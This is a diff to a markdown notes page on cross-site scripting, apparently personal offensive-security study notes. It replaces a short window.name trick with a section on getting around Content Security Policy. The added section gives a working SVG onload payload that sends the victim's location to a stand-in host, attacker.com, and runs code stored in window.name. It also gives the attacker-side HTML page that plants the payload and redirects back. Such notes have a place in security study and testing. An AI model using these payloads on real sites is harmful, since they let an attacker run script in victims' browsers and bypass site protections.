@@ -52,7 +52,19 @@ pagetitle: XSS
 ```
 - Then, just host the file and XSS using `<script src=http://localhost/file.js></script>`
 
-**Miscellaneous**
-- If we can't use very many characters, we could use `windows.name` to include data and execute from there
-  - `windows.name` is kept 100% cross-site, so if we set it on an attacker site and then redirect the user, we can store the payload there
-  - Then, we do `<script>eval(parent.name)</script>`
+**Getting around CSPs**
+- Since CSPs will prevent loading arbitrary scripts, we have to be a bit creative and use window properties
+  - Window properties will persist across pages, so we can redirect a user to an attacker site, set the content, and redirect back
+- An example payload: `<svg/onload="(name&&eval(self.name))||(location='//attacker.com/?b='+escape(location))">`
+  - Originally, `self.name` is empty, so it sets the location to our attacker site
+  - The `b` URL parameter is provided the current location to redirect back to, once the payload is set
+  - Then, after the payload is set and we redirect back to the site, the XSS procs again, resulting in the first half of the payload executing
+- The site we redirect to can be something simple, such as: 
+
+```html
+<!doctype html>
+<script>
+name = "";   // 1000-char payload as JS string literal
+location = unescape(location.search.slice(3)); // Get the redirect location 
+</script>
+```
